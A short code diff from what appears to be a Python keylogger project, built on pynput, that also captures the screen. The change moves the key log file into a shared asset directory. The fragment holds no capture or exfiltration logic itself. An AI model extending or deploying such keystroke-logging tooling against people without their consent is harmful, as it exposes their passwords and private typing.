@@ -3,11 +3,17 @@ import threading
 from shared_function import *
 import time
 from pynput.keyboard import Listener
+from capture_screen import ASSET_PATH
 
 listener = None
 
+# check directory and create if not exist
+if not check_file_exist(ASSET_PATH):
+    os.mkdir(ASSET_PATH)
+
 # setup logging
-logging.basicConfig(filename='key_logger.log',
+logfile_path = os.path.join(ASSET_PATH, "key_logger.log")
+logging.basicConfig(filename=logfile_path,
                     filemode='w',
                     level=logging.DEBUG,
                     format='%(asctime)s [%(levelname)s] %(message)s'
